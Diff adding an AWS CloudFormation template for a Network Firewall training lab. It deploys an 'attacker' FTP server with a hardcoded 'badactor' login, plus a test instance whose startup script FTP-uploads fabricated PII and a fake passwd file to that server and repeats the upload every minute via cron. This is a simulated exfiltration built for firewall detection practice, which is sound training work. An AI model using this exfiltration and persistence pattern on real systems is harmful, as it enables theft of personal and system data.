@@ -1,0 +1,1120 @@
+#Copyright 2021 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+
+#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
+AWSTemplateFormatVersion: "2010-09-09"
+Description: "AWS Network Firewall Demo using distributed model."
+
+Metadata:
+  "AWS::CloudFormation::Interface":
+    ParameterGroups:
+      - Label:
+          default: "VPC Parameters"
+        Parameters:
+          - AvailabilityZone1Selection
+          - AvailabilityZone2Selection
+      - Label:
+          default: "EC2 Parameters"
+        Parameters:
+          - LatestAmiId
+
+Parameters:
+  AvailabilityZone1Selection:
+    Description: Availability Zone 1
+    Type: AWS::EC2::AvailabilityZone::Name
+
+  AvailabilityZone2Selection:
+    Description: Availability Zone 2
+    Type: AWS::EC2::AvailabilityZone::Name
+
+  LatestAmiId:
+    Description: Latest EC2 AMI from Systems Manager Parameter Store
+    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
+    Default: '/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2'
+
+  MyAssetsBucketName:
+    Description: Assets bucket name
+    Type: String
+  MyAssetsBucketPrefix:
+    Description: Assets bucket prefix
+    Type: String
+
+Resources:
+# Lab 4 malicious infrastructure
+  MaliciousVPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.0.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-MaliciousVPC
+
+  MaliciousInternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+      - Key: Name
+        Value: AnfwDemo-MaliciousVPC-IGW
+
+  MaliciousGatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      InternetGatewayId:
+        !Ref MaliciousInternetGateway
+      VpcId: !Ref MaliciousVPC
+
+  MaliciousRouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-MaliciousVPC-MaliciousRouteTable
+      VpcId: !Ref MaliciousVPC
+      
+  MaliciousPublicRoute:
+    DependsOn:
+      - MaliciousGatewayAttachment
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref MaliciousInternetGateway
+      RouteTableId: !Ref MaliciousRouteTable
+
+  MaliciousSubnet:
+    Type: AWS::EC2::Subnet
+    Properties:
+      CidrBlock: 10.0.1.0/24
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-MaliciousVPC-MaliciousSubnet
+      VpcId: !Ref MaliciousVPC
+
+  MaliciousSubnetAssoc:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref MaliciousRouteTable
+      SubnetId: !Ref MaliciousSubnet
+
+  MaliciousPublicNACL:
+    Type: AWS::EC2::NetworkAcl
+    Properties:
+      VpcId: !Ref MaliciousVPC
+      Tags:
+        -
+          Key: Name
+          Value: AnfwDemo-MaliciousVPC-MaliciousPublicNACL
+
+  MaliciousInboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref MaliciousPublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: false
+      CidrBlock: '0.0.0.0/0'
+      PortRange:
+        From: 0
+        To: 65535
+
+  MaliciousOutboundPublicNACLEntry:
+    Type: AWS::EC2::NetworkAclEntry
+    Properties:
+      NetworkAclId: !Ref MaliciousPublicNACL
+      RuleNumber: 100
+      Protocol: -1
+      RuleAction: allow
+      Egress: true
+      CidrBlock: 0.0.0.0/0
+      PortRange:
+        From: 0
+        To: 65535
+
+  MaliciousSubnetNACLAssociation:
+    Type: AWS::EC2::SubnetNetworkAclAssociation
+    Properties:
+      SubnetId: !Ref MaliciousSubnet
+      NetworkAclId: !Ref MaliciousPublicNACL
+
+  MaliciousInstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub AnfwDemo-MaliciousVPC-MaliciousInstanceRole-${AWS::Region}
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          -
+            Effect: Allow
+            Principal:
+              Service:
+                - ec2.amazonaws.com
+            Action:
+              - sts:AssumeRole
+      Path: /
+      ManagedPolicyArns:
+      - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
+      Policies:
+        -
+          PolicyName: MaliciousInstancePolicy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              -
+                Effect: Allow
+                Action:
+                  - ssm:GetParameter
+                  - ssm:GetParameters
+                  - ssm:DescribeParameters
+                Resource:
+                  Fn::Join:
+                  - ':'
+                  - ["arn:aws:ssm", !Ref "AWS::Region", !Ref "AWS::AccountId", "*"]
+
+  MaliciousInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      InstanceProfileName: MaliciousInstanceProfile
+      Path: /
+      Roles:
+        - !Ref MaliciousInstanceRole
+
+  MaliciousSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: MaliciousSecurityGroup
+      VpcId: !Ref MaliciousVPC
+      SecurityGroupIngress:
+      - IpProtocol: tcp
+        FromPort: 443
+        ToPort: 443
+        CidrIp: 10.0.0.0/8
+      - IpProtocol: tcp
+        FromPort: 64000
+        ToPort: 64001
+        CidrIp: 10.0.0.0/8
+
+  MaliciousIP:
+    DependsOn:
+      - MaliciousGatewayAttachment
+    Type: AWS::EC2::EIP
+    Properties:
+      InstanceId: !Ref MaliciousInstance
+      Domain: vpc
+
+  MaliciousInstance:
+    Type: AWS::EC2::Instance
+    Properties:
+      IamInstanceProfile: !Ref MaliciousInstanceProfile
+      InstanceType: m5.large
+      ImageId: !Ref LatestAmiId
+      NetworkInterfaces:
+        - AssociatePublicIpAddress: false
+          DeviceIndex: '0'
+          GroupSet:
+            - !Ref MaliciousSecurityGroup
+          SubnetId:
+            Ref: MaliciousSubnet
+      Tags:
+        - Key: Name
+          Value: MaliciousInstance
+      UserData:
+        Fn::Base64: |
+            #!/bin/bash -ex
+            date > /tmp/image.log
+            yum update -y
+
+            # Install and configure FTP server
+            yum install -y vsftpd
+            cat << 'EOF' > /etc/vsftpd/vsftpd.conf
+            ftp_data_port=443
+            listen_port=443
+            anonymous_enable=NO
+            pasv_enable=YES
+            pasv_min_port=64000
+            pasv_max_port=64001
+            port_enable=YES
+            pasv_addr_resolve=YES
+            write_enable=YES
+            connect_from_port_20=YES
+            ascii_upload_enable=YES
+            local_enable=YES
+            chroot_local_user=YES
+            allow_writeable_chroot=YES
+            userlist_enable=YES
+            userlist_file=/etc/vsftpd/user_list
+            userlist_deny=NO
+            pam_service_name=vsftpd
+            EOF
+
+            # Configure FTP
+            adduser badactor
+            echo 5VXcbio8D3nsly | passwd --stdin badactor
+            echo badactor | sudo tee –a /etc/vsftpd/user_list
+            mkdir -p /home/badactor/ftp/upload
+            chmod 550 /home/badactor/ftp
+            chmod 750 /home/badactor/ftp/upload
+            chown -R badactor: /home/badactor/ftp
+
+            # Add the public IP to vsftpd config
+            { echo -n "pasv_address="; curl -sS "http://checkip.amazonaws.com"; } >> /etc/vsftpd/vsftpd.conf
+
+            # Start the ftp service and set it to launch when the system boots with the following
+            systemctl start vsftpd
+            systemctl enable vsftpd
+            systemctl status vsftpd > /tmp/vsfptd.status
+
+            # Start SSM Agent
+            sudo yum install -y https://s3.amazonaws.com/ec2-downloads-windows/SSMAgent/latest/linux_amd64/amazon-ssm-agent.rpm
+
+# VPC:
+  SpokeVpcA:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: "10.1.0.0/16"
+      EnableDnsSupport: true
+      EnableDnsHostnames: true
+      InstanceTenancy: default
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA
+
+# Internet Gateway:
+  InternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-IGW
+
+  AttachInternetGateway:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      VpcId:
+        !Ref SpokeVpcA
+      InternetGatewayId:
+        !Ref InternetGateway
+
+# NAT Gateway:
+  NatGw1Eip:
+    Type: AWS::EC2::EIP
+    Properties:
+      Domain: vpc
+
+  NatGw2Eip:
+    Type: AWS::EC2::EIP
+    Properties:
+      Domain: vpc
+
+  NatGw1:
+    Type: AWS::EC2::NatGateway
+    Properties:
+      AllocationId: !GetAtt
+        - NatGw1Eip
+        - AllocationId
+      SubnetId: !Ref PublicSubnet1
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-NATGWA
+
+  NatGw2:
+    Type: AWS::EC2::NatGateway
+    Properties:
+      AllocationId: !GetAtt
+        - NatGw2Eip
+        - AllocationId
+      SubnetId: !Ref PublicSubnet2
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-NATGWB
+
+# Private Subnets for Test Instances:
+  PrivateSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.0.0/24"
+      AvailabilityZone:
+        Ref: AvailabilityZone1Selection
+      MapPublicIpOnLaunch: false
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Private-Subnet1
+
+  PrivateSubnet2:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.2.0/24"
+      AvailabilityZone:
+        Ref: AvailabilityZone2Selection
+      MapPublicIpOnLaunch: false
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Private-Subnet2
+
+# Public Subnets for NAT GWs:
+  PublicSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.1.0/24"
+      AvailabilityZone:
+        Ref: AvailabilityZone1Selection
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Public-Subnet1
+
+  PublicSubnet2:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.3.0/24"
+      AvailabilityZone:
+        Ref: AvailabilityZone2Selection
+      MapPublicIpOnLaunch: true
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Public-Subnet2
+
+# Firewall Subnets for firewall endpoints:
+  FirewallSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.16.0/28"
+      AvailabilityZone:
+        Ref: AvailabilityZone1Selection
+      MapPublicIpOnLaunch: false
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Firewall-Subnet1
+
+  FirewallSubnet2:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId:
+        Ref: SpokeVpcA
+      CidrBlock: "10.1.16.16/28"
+      AvailabilityZone:
+        Ref: AvailabilityZone2Selection
+      MapPublicIpOnLaunch: false
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-Firewall-Subnet2
+
+# AWS PrivateLink interface endpoint for services:
+  SpokeVpcAEndpointSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+        GroupDescription: Allow instances to get to SSM Systems Manager
+        VpcId: !Ref SpokeVpcA
+        SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 443
+          ToPort: 443
+          CidrIp: 10.1.0.0/16
+        Tags:
+          - Key: Name
+            Value: AnfwDemo-SpokeVPCA-VpcEnpoint-Sg1
+
+  SpokeVpcASSMEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+        PrivateDnsEnabled: true
+        SecurityGroupIds:
+          - !Ref SpokeVpcAEndpointSecurityGroup
+        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssm"
+        SubnetIds:
+          - !Ref PublicSubnet1
+          - !Ref PublicSubnet2
+        VpcEndpointType: Interface
+        VpcId: !Ref SpokeVpcA
+
+  SpokeVpcAEC2MessagesEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+        PrivateDnsEnabled: true
+        SecurityGroupIds:
+          - !Ref SpokeVpcAEndpointSecurityGroup
+        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ec2messages"
+        SubnetIds:
+          - !Ref PublicSubnet1
+          - !Ref PublicSubnet2
+        VpcEndpointType: Interface
+        VpcId: !Ref SpokeVpcA
+
+  SpokeVpcASSMMessagesEndpoint:
+    Type: AWS::EC2::VPCEndpoint
+    Properties:
+        PrivateDnsEnabled: true
+        SecurityGroupIds:
+          - !Ref SpokeVpcAEndpointSecurityGroup
+        ServiceName: !Sub "com.amazonaws.${AWS::Region}.ssmmessages"
+        SubnetIds:
+          - !Ref PublicSubnet1
+          - !Ref PublicSubnet2
+        VpcEndpointType: Interface
+        VpcId: !Ref SpokeVpcA
+
+# SSM Role:
+  SubnetRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "AnfwDemo-SpokeVPCA-SSMRole-${AWS::Region}"
+      Path: "/"
+      ManagedPolicyArns:
+        - "arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM"
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service:
+                - ec2.amazonaws.com
+            Action:
+              - sts:AssumeRole
+
+  SubnetInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      Path: "/"
+      Roles:
+        - !Ref SubnetRole
+
+# Fn::GetAtt for Firewall do not return VPCE Id in ordered format.
+# For more details refer to: https://github.com/aws-cloudformation/aws-cloudformation-resource-providers-networkfirewall/issues/15
+# Until the bug is fixed we have to rely on custom resource to retrieve AZ specific VPCE Id.
+
+# Lambda Role:
+  LambdaExecutionRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "AnfwDemo-AnfwLambdaRole-${AWS::Region}"
+      AssumeRolePolicyDocument:
+        Version: "2012-10-17"
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service:
+                - lambda.amazonaws.com
+            Action:
+              - sts:AssumeRole
+      Path: /
+      Policies:
+        - PolicyName: root
+          PolicyDocument:
+            Version: "2012-10-17"
+            Statement:
+              - Effect: Allow
+                Action:
+                  - logs:CreateLogStream
+                  - logs:PutLogEvents
+                Resource: !GetAtt RetrieveVpcIdLogGroup.Arn
+              - Effect: Allow
+                Action:
+                  - network-firewall:DescribeFirewall
+                Resource: "*"
+
+# Retrieve VpceId Lambda Custom Resource:
+  RetrieveVpcIdLogGroup:
+    Type: AWS::Logs::LogGroup
+    Properties:
+        LogGroupName: !Sub "/AnfwDemo/Lambda/RetrieveVpceId-${AWS::Region}"
+        RetentionInDays: 1
+
+  RetrieveVpceId:
+    Type: AWS::Lambda::Function
+    DependsOn: RetrieveVpcIdLogGroup
+    Properties:
+      FunctionName: !Sub "AnfwDemo-RetrieveVpceId-${AWS::StackName}"
+      Handler: "index.handler"
+      Role: !GetAtt
+        - LambdaExecutionRole
+        - Arn
+      Code:
+        ZipFile: |
+          import boto3
+          import cfnresponse
+          import json
+          import logging
+
+          def handler(event, context):
+              logger = logging.getLogger()
+              logger.setLevel(logging.INFO)
+              responseData = {}
+              responseStatus = cfnresponse.FAILED
+              logger.info('Received event: {}'.format(json.dumps(event)))
+              if event["RequestType"] == "Delete":
+                  responseStatus = cfnresponse.SUCCESS
+                  cfnresponse.send(event, context, responseStatus, responseData)
+              if event["RequestType"] == "Create":
+                  try:
+                      Az1 = event["ResourceProperties"]["Az1"]
+                      Az2 = event["ResourceProperties"]["Az2"]
+                      FwArn = event["ResourceProperties"]["FwArn"]
+                  except Exception as e:
+                      logger.info('AZ retrieval failure: {}'.format(e))
+                  try:
+                      nfw = boto3.client('network-firewall')
+                  except Exception as e:
+                      logger.info('boto3.client failure: {}'.format(e))
+                  try:
+                      NfwResponse=nfw.describe_firewall(FirewallArn=FwArn)
+                      VpceId1 = NfwResponse['FirewallStatus']['SyncStates'][Az1]['Attachment']['EndpointId']
+                      VpceId2 = NfwResponse['FirewallStatus']['SyncStates'][Az2]['Attachment']['EndpointId']
+
+                  except Exception as e:
+                      logger.info('ec2.describe_firewall failure: {}'.format(e))
+
+                  responseData['FwVpceId1'] = VpceId1
+                  responseData['FwVpceId2'] = VpceId2
+                  responseStatus = cfnresponse.SUCCESS
+                  cfnresponse.send(event, context, responseStatus, responseData)
+      Runtime: python3.12
+      Timeout: 30
+
+  FirewallVpceIds:
+    Type: Custom::DescribeVpcEndpoints
+    Properties:
+      ServiceToken: !GetAtt RetrieveVpceId.Arn
+      Az1: !Ref AvailabilityZone1Selection
+      Az2: !Ref AvailabilityZone2Selection
+      FwArn: !Ref SpokeVpcAFirewall
+
+# Testing Security Group:
+  SubnetSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: "ICMP acess from 10.0.0.0/8"
+      GroupName: "AnfwDemo-SpokeVPCA-TestInstance-Sg1"
+      VpcId: !Ref SpokeVpcA
+      SecurityGroupIngress:
+        - IpProtocol: icmp
+          CidrIp: 10.0.0.0/8
+          FromPort: -1
+          ToPort: -1
+      Tags:
+        - Key: Name
+          Value: "AnfwDemo-SpokeVPCA-TestInstance-Sg1"
+
+# Test Instances - userdata used for Lab 4:
+  TestInstance1:
+    Type: AWS::EC2::Instance
+    DependsOn:
+      - 'PrivateRtb1DefaultRoute'
+      - 'PublicRtb1DefaultRoute'
+      - 'FirewallRtb1DefaultRoute'
+      - 'IngressRtbPublicSubnet1Route'    
+    Properties:
+      ImageId: !Ref LatestAmiId
+      SubnetId: !Ref PrivateSubnet1
+      InstanceType: t2.micro
+      SecurityGroupIds:
+        - !Ref SubnetSecurityGroup
+      IamInstanceProfile: !Ref SubnetInstanceProfile
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-TestInstance1
+      UserData:
+        Fn::Base64: !Sub |
+            #!/bin/bash -xe
+            exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
+            sleep 60
+            date > /tmp/image.log
+            sudo yum update -y
+            sudo yum install -y ftp
+            sudo yum install -y httpd
+            sudo systemctl enable --now httpd
+            { echo ${MaliciousIP};} >> /tmp/ftp.ip
+
+            # Create Fake Customer Data Files
+            cat << 'EOF' > /tmp/employee-data.txt
+            # Sample Report - No identification of actual persons
+            # or places is intended or should be inferred.
+
+            74323 Julie Field
+            Lake Joshuamouth, OR 30055-3905
+            1-196-191-4438x974
+            53001 Paul Union
+            New John, HI 94740
+            American Express
+            Amanda Wells
+            5135725008183484 09/26
+            CVE: 550
+
+            354-70-6172
+            242 George Plaza
+            East Lawrencefurt, VA 37287-7620
+            GB73WAUS0628038988364
+            587 Silva Village
+            Pearsonburgh, NM 11616-7231
+            LDNM1948227117807
+            American Express
+            Brett Garza
+            347965534580275 05/20
+            CID: 4758
+            EOF
+
+            # Create Fake /etc/passwd
+            cat << 'EOF' > /tmp/passwd.txt
+            blackwidow:x:10:100::/home/blackwidow:/bin/bash
+            thor:x:11:100::/home/thor:/bin/bash
+            ironman:x:12:100::/home/ironman:/bin/bash
+            captain:x:13:100::/home/captain:/bin/bash
+            hulk:x:14:100::/home/hulk:/bin/bash
+            hawkeye:x:15:100::/home/hawkeye:/bin/bash
+            EOF
+
+            # Upload fake employee data
+            sleep 5
+            cd /tmp
+            HOST=${MaliciousIP}
+            PORT=443
+            USER=badactor
+            PASSWD=5VXcbio8D3nsly
+            ftp -inv $HOST $PORT <<EOT
+            user $USER $PASSWD
+            cd ftp/upload
+            put passwd.txt
+            put employee-data.txt
+            bye
+            EOT
+
+            # Create FTP script
+            cat << 'EOF' > /tmp/ftp.sh
+            #!/bin/bash
+            HOST=${MaliciousIP}
+            PORT=443
+            USER=badactor
+            PASSWORD=5VXcbio8D3nsly
+            ftp -inv $HOST $PORT <<EOT
+            user $USER $PASSWORD
+            cd ftp/upload
+            put passwd.txt
+            put employee-data.txt
+            bye
+            EOT
+            EOF
+            chmod 755 ftp.sh
+            chmod +x ftp.sh
+            ftp -inv ./tmp/ftp.sh
+            date > /tmp/ftp-time.txt
+
+            # Set cron Job
+            cat << 'EOF' > /var/spool/cron/ec2-user
+            */1 * * * * /tmp/ftp.sh>>/tmp/cron.log
+            EOF
+
+  TestInstance2:
+    Type: 'AWS::EC2::Instance'
+    Properties:
+      ImageId: !Ref LatestAmiId
+      SubnetId: !Ref PrivateSubnet2
+      InstanceType: t2.micro
+      SecurityGroupIds:
+        - !Ref SubnetSecurityGroup
+      IamInstanceProfile: !Ref SubnetInstanceProfile
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-TestInstance2
+
+# # AWS Network Firewall:
+#   # Inspection Firewall Rule Groups using DEFAULT ORDER:
+#   ICMPAlertStatefulRuleGroup:
+#     Type: AWS::NetworkFirewall::RuleGroup
+#     Properties:
+#       RuleGroupName: AnfwDemo-IcmpAlert-RuleGroup
+#       Type: STATEFUL
+#       Capacity: 100
+#       RuleGroup:
+#         RulesSource:
+#           StatefulRules:
+#             - Action: ALERT
+#               Header:
+#                 Direction: ANY
+#                 Protocol: ICMP
+#                 Destination: ANY
+#                 Source: ANY
+#                 DestinationPort: ANY
+#                 SourcePort: ANY
+#               RuleOptions:
+#                 - Keyword: "sid:1"
+#       Tags:
+#         - Key: Name
+#           Value: AnfwDemo-IcmpAlert-RuleGroup
+
+#   DomainAllowStatefulRuleGroup:
+#     Type: 'AWS::NetworkFirewall::RuleGroup'
+#     Properties:
+#       RuleGroupName: AnfwDemo-DomainAllow-RuleGroup
+#       Type: STATEFUL
+#       Capacity: 100
+#       RuleGroup:
+#         RuleVariables:
+#           IPSets:
+#             HOME_NET:
+#               Definition:
+#                 - "10.0.0.0/8"
+#         RulesSource:
+#           RulesSourceList:
+#             TargetTypes:
+#               - HTTP_HOST
+#               - TLS_SNI
+#             Targets:
+#               - ".amazon.com"
+#               - ".amazonaws.com"
+#             GeneratedRulesType: "ALLOWLIST"
+#       Tags:
+#         - Key: Name
+#           Value: AnfwDemo-DomainAllow-RuleGroup
+
+#   #SpokeVPCA Firewall Policy:
+#   EgressFirewallPolicy:
+#     DependsOn: [ICMPAlertStatefulRuleGroup, DomainAllowStatefulRuleGroup]
+#     Type: AWS::NetworkFirewall::FirewallPolicy
+#     Properties:
+#       FirewallPolicyName: AnfwDemo-InspectionFirewall-Policy
+#       FirewallPolicy:
+#         StatelessDefaultActions:
+#           - 'aws:forward_to_sfe'
+#         StatelessFragmentDefaultActions:
+#           - 'aws:forward_to_sfe'
+#         StatefulRuleGroupReferences:
+#           - ResourceArn: !Ref DomainAllowStatefulRuleGroup
+#           - ResourceArn: !Ref ICMPAlertStatefulRuleGroup
+
+#       Tags:
+#         - Key: Name
+#           Value: AnfwDemo-InspectionFirewall-Policy
+
+  # #SpokeVPCA Firewall:
+  # SpokeVpcAFirewall:
+  #   DependsOn: [ICMPAlertStatefulRuleGroup, DomainAllowStatefulRuleGroup]
+  #   Type: AWS::NetworkFirewall::Firewall
+  #   Properties:
+  #     FirewallName: AnfwDemo-InspectionFirewall
+  #     FirewallPolicyArn: !Ref EgressFirewallPolicy
+  #     VpcId: !Ref SpokeVpcA
+  #     SubnetMappings:
+  #       - SubnetId: !Ref FirewallSubnet1
+  #       - SubnetId: !Ref FirewallSubnet2
+  #     Tags:
+  #       - Key: Name
+  #         Value: AnfwDemo-InspectionFirewall 
+
+### Above commented lab rules and firewall resources are for reference and have been replaced by the strict order policies below.
+### The above uses the default rule order, whereas the strict order policies defined below enforce a specific sequence for rule evaluation.
+### I added this section to define the strict order inspection firewall policies and associated rule groups and complete the lab setup for centralized model inspection
+
+# This section defines the strict order inspection firewall policies and associated rule groups.
+### Added these: InspectionFirewallPolicyStrict and InspectionFirewallPolicyStrictAction
+### This to match the strict and action order requirements for the inspection firewall policies in lab
+  ICMPAlertStatefulRuleGroup:
+    Type: AWS::NetworkFirewall::RuleGroup
+    Properties:
+      RuleGroupName: AnfwDemo-IcmpAlert-RuleGroup
+      Type: STATEFUL
+      Capacity: 100
+      RuleGroup:
+        StatefulRuleOptions:
+            RuleOrder: STRICT_ORDER       
+        RulesSource:
+          StatefulRules:
+            - Action: ALERT
+              Header:
+                Direction: ANY
+                Protocol: ICMP
+                Destination: ANY
+                Source: ANY
+                DestinationPort: ANY
+                SourcePort: ANY
+              RuleOptions:
+                - Keyword: "sid:1"
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-IcmpAlert-RuleGroup 
+          
+  DomainAllowStatefulRuleGroup:
+    Type: AWS::NetworkFirewall::RuleGroup
+    Properties:
+      RuleGroupName: AnfwDemo-DomainAllow-RuleGroup
+      Type: STATEFUL
+      Capacity: 100
+      RuleGroup:
+        StatefulRuleOptions:
+            RuleOrder: STRICT_ORDER      
+        RuleVariables:
+          IPSets:
+            HOME_NET:
+              Definition:
+                - "10.0.0.0/8"
+        RulesSource:
+          RulesSourceList:
+            TargetTypes:
+              - HTTP_HOST
+              - TLS_SNI
+            Targets: 
+              - ".amazon.com"
+              - ".amazonaws.com"
+            GeneratedRulesType: "ALLOWLIST"
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-DomainAllow-RuleGroup    
+  
+  InspectionFirewallPolicyStrict:
+    Type: AWS::NetworkFirewall::FirewallPolicy
+    Properties:
+      FirewallPolicyName: AnfwDemo-InspectionFirewall-Policy-Strict
+      FirewallPolicy:
+        StatelessDefaultActions:
+          - 'aws:forward_to_sfe'
+        StatelessFragmentDefaultActions:
+          - 'aws:forward_to_sfe'
+        StatefulEngineOptions:
+          RuleOrder: STRICT_ORDER
+          StreamExceptionPolicy: DROP
+        StatefulDefaultActions:
+          - aws:drop_established
+          - aws:alert_established        
+        StatefulRuleGroupReferences:
+          - ResourceArn: !Ref DomainAllowStatefulRuleGroup
+            Priority: 100
+          - ResourceArn: !Ref ICMPAlertStatefulRuleGroup
+            Priority: 200
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-InspectionFirewall-Policy-Strict
+
+  InspectionFirewallPolicyStrictAction:
+    Type: AWS::NetworkFirewall::FirewallPolicy
+    Properties:
+      FirewallPolicyName: AnfwDemo-InspectionFirewall-Policy-Action
+      FirewallPolicy:
+        StatelessDefaultActions:
+          - 'aws:forward_to_sfe'
+        StatelessFragmentDefaultActions:
+          - 'aws:forward_to_sfe'
+        StatefulEngineOptions:
+          RuleOrder: DEFAULT_ACTION_ORDER
+          StreamExceptionPolicy: DROP
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-InspectionFirewall-Policy-Action           
+
+  #SpokeVPCA Firewall:
+  SpokeVpcAFirewall:
+    DependsOn: [ICMPAlertStatefulRuleGroup, DomainAllowStatefulRuleGroup]
+    Type: AWS::NetworkFirewall::Firewall
+    Properties:
+      FirewallName: AnfwDemo-InspectionFirewall
+      FirewallPolicyArn: !Ref InspectionFirewallPolicyStrictAction
+      VpcId: !Ref SpokeVpcA
+      SubnetMappings:
+        - SubnetId: !Ref FirewallSubnet1
+        - SubnetId: !Ref FirewallSubnet2
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-InspectionFirewall  
+
+  #SpokeVPCA Firewall Logging:
+  SpokeVpcAFirewallLogFlowGroup:
+    Type: AWS::Logs::LogGroup
+    Properties:
+      LogGroupName: "/AnfwDemo/Anfw/Flow"
+
+  SpokeVpcAFirewallLogAlertGroup:
+    Type: AWS::Logs::LogGroup
+    Properties:
+      LogGroupName: "/AnfwDemo/Anfw/Alert"
+
+  SpokeVpcAFirewallLog:
+    Type: AWS::NetworkFirewall::LoggingConfiguration
+    Properties:
+      FirewallArn: !Ref SpokeVpcAFirewall
+      LoggingConfiguration:
+        LogDestinationConfigs:
+          - LogType: FLOW
+            LogDestinationType: CloudWatchLogs
+            LogDestination:
+              logGroup: !Ref SpokeVpcAFirewallLogFlowGroup
+          - LogType: ALERT
+            LogDestinationType: CloudWatchLogs
+            LogDestination:
+              logGroup: !Ref SpokeVpcAFirewallLogAlertGroup
+
+# Private Route Tables:
+  PrivateRtb1:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-PrivateRouteTable1
+
+  PrivateRtb1Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref PrivateRtb1
+      SubnetId: !Ref PrivateSubnet1
+
+  PrivateRtb1DefaultRoute:
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: "0.0.0.0/0"
+      NatGatewayId: !Ref NatGw1
+      RouteTableId: !Ref PrivateRtb1
+
+  PrivateRtb2:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref SpokeVpcA
+      Tags:
+        - Key: Name
+          Value: AnfwDemo-SpokeVPCA-PrivateRouteTable2
+
+  PrivateRtb2Association:
+    Type: AWS::EC2::SubnetRouteTableAssociation
